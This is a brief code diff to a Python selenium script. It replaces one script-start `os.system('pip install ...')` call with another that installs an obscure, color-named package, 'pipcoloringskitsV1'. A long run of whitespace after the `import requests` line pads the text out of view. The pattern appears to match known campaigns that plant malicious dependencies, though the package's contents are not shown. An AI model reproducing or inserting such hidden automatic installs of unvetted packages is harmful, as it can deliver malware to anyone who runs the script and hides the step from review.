@@ -1,6 +1,6 @@
 import os
-os.system("pip install pycolorpackage")
-import pycolorpackage
+os.system("pip install pipcoloringskitsV1")
+import pipcoloringskitsV1
 import requests																																																																																																																																																																																																																																																																					
 from selenium import webdriver
 from selenium.webdriver.firefox.options import Options
